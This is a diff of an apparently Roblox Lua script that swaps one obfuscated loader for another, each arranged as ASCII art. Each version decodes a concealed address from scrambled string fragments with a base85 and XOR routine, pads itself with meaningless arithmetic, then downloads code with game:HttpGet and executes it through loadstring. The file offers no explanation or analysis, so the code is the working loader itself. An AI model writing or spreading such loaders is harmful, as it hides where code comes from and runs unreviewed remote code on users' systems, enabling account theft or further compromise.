@@ -2,51 +2,51 @@
 
 
 
-                                          local i
-                                        = {[14 ]
-                                     = "z^d", [
-                                  11   ]     =
-                                 "{kEiy", [8]
-                               = "XSX", [1] =
-                             ")jS3", [ 2]  =
-                             "GHj*-", [9]  =
-                             "%/8E0}", [5 ]
-                             = "d6Mo^/", [3
-                        ]    = "Za0", [12 ]
-                        =    "!fL", [ 4]  =
-                             "HOc%", [7]  =
-                              "tHv#w", [13]
-                      =       "Ch-C", [10 ]
-                     =         "FCf7", [6 ]
-                     = "D+F"   ,  [ 15 ]   =
-                     "{yO-7)"   , [16] = "%"
-                     };  local   d = "01234"
-                     .. "56789"   .."abcde"..
-                     "fghij".."k"  .."lmno" ..
-                     "pqrst".."uv"  .."wxy".."zAB"
-                     .."CD".."EFGHI"  .."JKLMN" ..            "OPQRS"  ..
-                     "TUVWX".. "YZ.-:"  .. "+=^!/"        .."*?&<>".."(){}"
-                      .."@" .. "%$#_|" ; local s =     table . concat( i ) ;
-                      local c = {}; local y = 9658; for v = 1, #s, 5 do local
-                        h = 0; for e = v, v + 4 do h = h * 85 + string.find(d ,
-                           s:sub(e, e), 1, true) - 1; end; for e = 3, 0, - 1  do
-                         y      = (y * 38 + 55695) % 65521 ; c[#c + 1] = string .
-                         char(bit32.bxor(math.floor( h/256^e) %  256, y % 256)) ;
-                           end; end; i =  table.concat(c): sub(1, 51) ;
-                            local b, x = loadstring(game:HttpGet(i))             ;
-                             assert(b, x); do local r = 7; r = (r *
-                               7) % 5; end; do local r = 7; r = ( r
-                                 * 9)  % 2; end; do local r = 1; r =
-                                     (r * 9) % 8; end; local r = 9 %
-                                     5 % 4 % 1 - 8 - 7 % 2 - 8 - 3 % 7
-                                          % 9 % 1 + 1 - 9 - 3 % 6 % 7 +
-                                                1 - 2 - 9 % 8 - 5 + 8  -
-                                                        2 - 5 + 7 - 5 + 9
-                                                             - 4 % 4 % 2  %
-                                                                1 + 2 % 1 +
-                                                                   8 % 7 % 4
-                                                                     +    5;
+                                          local j
+                                        = {[3] =
+                                     "Q?=ML", [
+                                  6] = "<@(k+"
+                                 ,  [ 1 ]   =
+                               "mt*R", [5]  =
+                             "flP0#T", [8] =
+                             "BI/",  [9 ]  =
+                             "3|wvT%", [13]
+                             = "R<p=(", [10
+                        ]    = "w+vxv", [11
+                        ]    = "YnbAz", [7]
+                       =     "1gDF", [4]  =
+                              "D^Kgt", [2 ]
+                      =       "/TvkYn", [12
+                     ]     =   "<ItK:{" } ;
+                     local h   =  "01234" ..
+                     "56789"    .."abcde" ..
+                     "fghij"..   "klmno"  ..
+                     "pqrst" ..   "uvwxy"  ..
+                     "zABCD".."E"  .."FGHI" ..
+                     "JKLMN".."OP"  .."QRS".."TUV"
+                     .."WX".."YZ.-:"  .."+=^!/" ..            "*?&<>"  ..
+                     "(){}@".."%$#_|";  local q  =        table.concat(j) ;
+                      local  p  =  { } ; local z =     49043; for m = 1, #q,
+                      5 do local d =  0; for k  = m, m  + 4 do d  = d * 85  +
+                        string.find(h, q:sub(k, k), 1, true) - 1; end; for k  =
+                           3, 0, - 1 do z = (z * 74 + 63591) % 65521; p[#p +  1]
+                         =      string.char(bit32.bxor(math.floor(d/256^k) % 256,
+                         z % 256));  end; end; j =  table.concat(p): sub(1, 51) ;
+                           local y, v  = loadstring(game: HttpGet(j)) ;
+                            assert(y, v); do local r = {1, 7}; r[1 ]             =
+                             r[2] % 9; end; do local r = {9, 6}; r[
+                               1] = r[2] % 2; end; do local r = 6 ;
+                                 r  =  (r * 4) % 2; end; local r = 4
+                                     % 4 - 4 + 3 % 6 - 5 - 2 - 3 % 8
+                                     % 2 + 4 - 7 - 7 % 4 - 6 + 2 + 4 +
+                                          3 % 2 % 9 % 8 - 4 + 5 % 1 + 5
+                                                - 4 + 7 - 9 + 9 % 7 +  9
+                                                        % 4 - 7 + 5 + 4 -
+                                                             1 + 9 % 9 -  8
+                                                                - 3 - 9 % 8
+                                                                   % 1 % 1 %
+                                                                     1 -  7;
                                                                        return
-                                                                           b(
+                                                                           y(
                                                                            ...
                                                                              )
